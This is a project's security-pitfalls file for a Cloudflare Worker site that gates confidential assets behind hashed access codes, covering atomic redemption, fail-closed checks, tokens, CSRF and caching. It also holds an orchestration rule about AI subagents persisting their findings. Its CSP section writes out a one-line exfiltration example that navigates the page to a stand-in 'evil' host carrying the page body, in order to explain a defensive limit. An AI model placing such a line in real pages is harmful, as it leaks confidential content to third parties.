# Implementation Pitfalls (project-specific, Cloudflare)

Traps carried from the design's security review plus Cloudflare-specific ones. Re-read before
implementing related code. Source of truth:
`docs/design/2026-07-02-gated-asset-sharing-site-design.cloudflare.md`.

## NEVER add an `assets` key to wrangler.jsonc (spec §4, §7)
Workers Static Assets are served BY THE PLATFORM, BEFORE the Worker runs. One config key would put
every confidential HTML file at a public, slug-guessable path. Asset HTML is compiled INTO the
Worker (Text modules); the Worker is the only door. The build (scripts/build-manifest.mjs) fails if
`assets` appears in wrangler.jsonc — do not "fix" that lint, fix the config.

## Store SHA-256(code), never the raw code (spec §3 D3, §5, §8)
The `codes` table stores `code_hash` ONLY. Redemption looks up by `SHA-256(code)`. The admin panel
reveals the raw code/link exactly ONCE at generation; it is unrecoverable afterward. A plaintext
`code` column, or an admin list that rebuilds a `?code=` link per row, silently leaks live reusable
bearer codes on any DB read/backup/export/Time-Travel restore.

**AMENDED 2026-07-03 (owner-ratified):** lookup remains hash-only, but the raw code is ALSO
stored AES-256-GCM-encrypted in `codes.code_enc` (key = the `CODE_VAULT_KEY` Worker secret,
`src/lib/vault.ts`) to power the admin Show-link action — see
`docs/design/2026-07-03-asset-manager-r2-and-recoverable-codes-design.md` §2. The invariant that
survives: the raw code is NEVER stored in the clear, never logged, and appears in no response
except show-once mint and the explicit Show-link action.

## Redemption is ONE atomic conditional UPDATE (spec §6 step 4)
Validate + `use_count+1` + `last_used_at=unixepoch()` + compute `cookie_exp` in a SINGLE statement:
`UPDATE codes SET use_count = use_count + 1, last_used_at = unixepoch() WHERE code_hash = ?1 AND
revoked_at IS NULL AND expires_at > unixepoch() AND asset_slug = ?2 RETURNING id, unixepoch() AS
iat, min(unixepoch() + 86400, expires_at) AS cookie_exp`. Issue the cookie IFF a row returns; fail
closed on error. Never check-then-write — a revoke can slip between the read and the write. D1
executes single statements atomically on the single-writer primary and never auto-retries writes.

## D1 is the single time source (spec §5)
Every expiry/validity/window comparison and default uses `unixepoch()` in SQL, never Worker
`Date.now()` (untrusted for authz; coarsened by the runtime). Time columns are INTEGER epoch
seconds. The 90-day default is the DB column default `DEFAULT (unixepoch() + 7776000)`. JS time is
display-only. Within one statement every `unixepoch()` sees the same instant (per-step 'now'
stability; the atomic UPDATE touches ≤1 row because `code_hash` is UNIQUE).

## SQLite expression DEFAULTs don't work in ALTER TABLE ADD COLUMN (spec §11)
`DEFAULT (unixepoch() + 7776000)` is valid in CREATE TABLE but SQLite REJECTS non-constant defaults
in `ADD COLUMN`. Any future migration reshaping such a column is a table-rebuild migration
(create-new → copy → rename), not an ADD COLUMN. Migrations are forward-only; rollback is code-only.

## D1 read replication stays OFF (spec §5)
A lagged replica read on the per-load recheck silently delays revocation. Replication is opt-in —
never enable it on this app's databases; if it ever must be, every gate query goes through
`withSession('first-primary')`. Standing configuration invariant.

## Fail closed on DB error (spec §3, §6)
The per-load recheck MUST deny when D1 errors or times out — never serve from the cookie alone.
Wrap READ-ONLY D1 calls (the recheck) in a short app-level timeout (Promise.race) so a blip fails
fast. Never app-time the redeem WRITE: the timer cannot cancel the statement, so a timed-out-but-
later-committed UPDATE would record usage without issuing access — await the write's real outcome
and fail closed on a thrown error. The rate LIMITER is the opposite: defense-in-depth, fails OPEN.
Never swap those behaviors.

## The access code is the entire secret (spec §3)
Never log the raw `?code=` or full `/a/*` URLs (Workers Logs capture what you print). Bind the
asset cookie to `{v,kid,slug,code_id,iat,cookie_exp}` only — never the code. Strip `?code=` via
the 302. Keep observability invocation logs minimal; no Logpush for this Worker.

## Signed tokens: versioned, canonical, key-ring (spec §6 step 4, §8, §10)
Asset + session tokens carry `{v, kid, …}` with strict schema validation (reject unknown/missing/
extra fields, unrecognized v/kid), alg PINNED to HS256. `SESSION_SECRET` and `ASSET_COOKIE_SECRET`
are KEY RINGS: sign with the current kid, verify current+previous, reject retired. Rotating a
secret is NOT the response to suspected code exposure — that is revoke + reissue the codes.

## Cookie lifetime capped by code expiry (spec §6 step 4)
`cookie_exp = min(unixepoch() + 86400, expires_at)`, returned FROM the atomic UPDATE on DB time.
A fixed 24h TTL that ignores a soon-expiring code is wrong.

## Confidential manifest is a generated MODULE + generator registry (spec §7)
The slug→title map aggregates client identities: it is compiled into the Worker
(`.generated/assets-manifest.ts`), never a routable file. `new-asset` appends each minted slug to
the COMMITTED `.generated/slugs.json`; the build REJECTS any asset folder whose slug is absent —
the registry, not the shape regex, is the D2 backstop. The external-origin scan is an advisory
lint; CSP is the containment boundary (§9).

## Bootstrap hash must be byte-compatible with the runtime verifier (spec §8)
`scripts/hash-password.mjs` (Node) and the Worker verifier BOTH use `@noble/hashes` argon2id
(pure JS) with the same pinned params (m=19456,t=2,p=1,dkLen=32,version=0x13) and standard PHC
encoding, so the printed hash verifies in-Worker byte-for-byte; the PHC-encoded string embeds
params+salt so verify reads them back. Never substitute a different argon2 implementation or
params on one side only, or the admin's correct password is rejected with no obvious cause.
`@node-rs/argon2` does NOT run on Workers (native addon). `hash-wasm` also does NOT run on
Workers: it compiles its WASM at runtime via `WebAssembly.compile(bytes)`, which workerd forbids
("Wasm code generation disallowed by embedder") — it cannot be the Worker-side verifier.

## TOTP: consume the step only AFTER the password verifies (spec §5, §8)
`verifyTotp` marks the matched step used — call it ONLY after the password check passes, else a
wrong-password attempt burns steps / probes replay state. Replay-rejection uses `totp_used_steps`
with `INSERT … ON CONFLICT DO NOTHING`; D1's `meta.changes === 0` means replay → reject. Prune
rows older than the ±1 window lazily.

## CSRF: pin the production origin; reject missing (spec §8)
Compare `Origin` to `PUBLIC_ORIGIN` (NOT the request's own Host). If `Origin` is absent, fall back
to a `Referer` same-origin check; treat cross-site / malformed / missing-without-fallback as
reject. `Sec-Fetch-Site` is corroboration only.

## Rate limiting: bucket unknown slugs; exempt ≠ unauthorized; never lock out (spec §9)
Bucket malformed/non-manifest slugs into fixed keys (`bad-shape`, `unknown-slug`) so a random-slug
spray can't mint unbounded `rate_limits` rows; only manifest slugs get a per-slug key (the manifest
lookup for KEYING is unconditional for every well-formed slug and never branches the RESPONSE —
the prohibited thing is failing early on manifest miss, which reopens the timing split). A
signature-valid-cookie load is limiter-EXEMPT but STILL DB-rechecked. The login limiter
throttles/backs off — a hard lockout on a single-admin site is a self-inflicted DoS. Increment
atomically (one upsert) on DB time.

## ENVIRONMENT gate fails CLOSED; non-prod D1 is a separate empty DB (spec §8, §10)
`/a/*` and `/admin/*` serve ONLY when `ENVIRONMENT === 'production'` — a positive allow; preview/
development/unset/anything else ⇒ the SAME generic failure page (no fingerprint). Local QA opts in
via `.dev.vars` `ENVIRONMENT=production` (local D1 only — never combine that override with remote
bindings). Each environment binds its OWN `database_id`; never point preview at the prod DB. The
D1 `meta` environment marker is verified by operators at setup and in production verification —
it is a binding-audit signal, not a runtime branch. There is no D1 branching — the preview DB is
empty by construction; keep it that way (migrations only, no prod imports).

## No zone-level cache or HTML-rewriting features on this hostname (spec §9)
Cache Rules / Cache Response Rules can override `no-store`; Rocket Loader / Email Obfuscation /
Mirage / Cloudflare Fonts rewrite HTML bodies (inject script into confidential assets; break
byte-identical failure parity). Never use `caches.default`, `cf: {cacheTtl|cacheEverything}`, or
any of the above for gated responses. Deployed checks assert `cf-cache-status` is never HIT and
responses are byte-stable.

## CSP cannot stop top-level-navigation exfiltration (spec §9, §15 Q2)
The `'self'` CSP blocks background beaconing, NOT `window.location = 'https://evil/#'+body`.
Accepted for trusted admin authoring, but §15 Q2 promotes sandboxed-iframe rendering to a
recommended reconsideration — direct top-frame render is a conscious owner decision.

---

## Orchestration

This section is the discovery hook for plan writers who arrive here via the `writing-plans-enhanced` (or equivalent) mandated-read path. The canonical rules live in `docs/git-strategy.md` → §Multi-agent coordination → Output persistence. This section does NOT restate those rules — it exists to make sure plan writers notice they apply.

### ORCH-1: Analysis Dispatches Must Persist Findings Before Returning

**Trigger:** Your plan dispatches parallel subagents (bug hunts, audits, phased analysis, parallel investigations) whose findings would be expensive to regenerate if lost.

**What you need to do:** Every such dispatched subagent MUST write its complete report to a persistent file BEFORE returning; the response message is not the sole record.

**Read the full rule:** `docs/git-strategy.md` → §Multi-agent coordination → Output persistence. That section carries the copy-pasteable prompt block (with `<PERSISTENCE_PATH>` substitution), file-path conventions, orchestrator commit cadence, and the cases where the rule doesn't apply.

**Why this is in implementation-pitfalls:** because the plan-writing skill mandates reading this file, and this rule has to be noticed at plan-write time (when the dispatch prompts are being drafted), not at execution time (when it's too late). The failure mode — orchestrator context compacting mid-consolidation and lossily dropping findings — is predictable and preventable if the plan author builds persistence into the dispatch prompts from the start.

### Review Checklist

- [ ] **Dispatch prompts include the mandatory-persistence block** — copy from `docs/git-strategy.md` §Output persistence; substitute `<PERSISTENCE_PATH>` with a durable per-subagent path (ORCH-1)
- [ ] **Plan specifies exact persistence paths, not "write somewhere useful"** — ambiguous paths default to `/tmp` under pressure, which doesn't survive (ORCH-1)
- [ ] **Orchestrator commits subagent artifacts wave-by-wave** — committed files land on the campaign branch before consolidation begins (ORCH-1)
